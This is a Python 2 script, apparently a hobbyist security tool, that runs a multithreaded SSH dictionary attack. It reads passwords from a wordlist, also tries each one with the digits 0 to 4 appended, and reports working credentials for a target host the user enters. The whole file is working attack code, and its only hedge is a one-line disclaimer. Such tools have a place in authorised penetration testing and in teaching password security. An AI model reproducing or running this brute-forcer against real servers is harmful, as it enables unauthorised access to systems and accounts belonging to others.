#!/usr/bin/env python

from pexpect import pxssh									        #for ssh
import time
from threading import *

found = False											        #found password

#Try to connect through ssh using the pxssh library

def connect(address, user, passwd, portnumber, release):
	global found

	try:
		print "[-] Testing:"+str(passwd)
		s = pxssh.pxssh()								        #initialise pxssh
		s.login(address, user, passwd, port=portnumber)					        #attempt login	if successfull set 'found' to true
		print 'Correct credentials found: '+user+'@'+address+':'+str(portnumber)+' Password: '+passwd
		found = True

	except Exception, e:

		if 'read_nonblocking' in str(e):						        #check exceptions
			time.sleep(5)								        #space out requests
			connect(address, user, passwd, portnumber, False)			        #try again
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(address, user, passwd, portnumber, False)
	finally:
		x = 0
		cycleconnect(address, user, passwd, portnumber, True)
		if release: connLock.release()						                #close connection

def cycleconnect(address, user, passwd, portnumber, release):						#repeat password appended with 0 to 4
	global found
	x = int(0)

	while x <5:											#append with numericals from 0 to x
		if found == False:
			cyclepasswd = passwd+str(x)
			x += 1
			try:
				print "[-] Testing:"+str(cyclepasswd)
				s = pxssh.pxssh()							#initialise pxssh
				s.login(address, user, cyclepasswd, port=portnumber)			#attempt login	if successfull set 'found' to true
				print 'Correct credentials found: '+user+'@'+address+':'+str(portnumber)+' Password: '+cyclepasswd
				found = True
				break
			except KeyboardInterrupt:                                               	#keyboard interrupt to exit
	        		os._exit()

			except Exception, e:

				if 'read_nonblocking' in str(e):					#check exceptions
					time.sleep(5)							#space out requests
					cycleconnect(address, user, passwd, portnumber, False)		#try again
				elif 'synchronize with original prompt' in str(e):
					time.sleep(1)
					cycleconnect(address, user, passwd, portnumber, False)
		else:
			break



def main():
	global connLock

        #intro text
        print '[*] SSH Dictionary Attack'
        print '[!] No permission is given for the use of this script in any context'

	#take options from user input
	address = raw_input('>> Input target host address (IP or hostname): ')
	portnumber = raw_input('>> Input target port (leave blank for default): ')
	user = raw_input('>> Input SSH username: ')
	passwdFile = raw_input('>> Input path to password list: ')
	maxConnections = int(raw_input('>> Set max thread count: '))

	#set port to 22 as default
	if portnumber == "":
		portnumber = 22
	connLock = BoundedSemaphore(value=maxConnections)					        #ensure only we can close connection
	#reading password file
	fn = open(passwdFile, 'r')
	for line in fn.readlines():
		try:
			if found:								        #check found bool
				print '[!] Exiting: Password Found'
				exit(0)
			connLock.acquire()							        #bind semaphore lock
			passwd= line.strip()								#get password
			t = Thread(target=connect, args=(address, user, passwd, portnumber, True))  	#set password with thread
			t.start()								        #start thread
		except KeyboardInterrupt:                                                               #keyboard interrupt to exit
        		exit()
#initiate
if __name__ == '__main__':
	main()

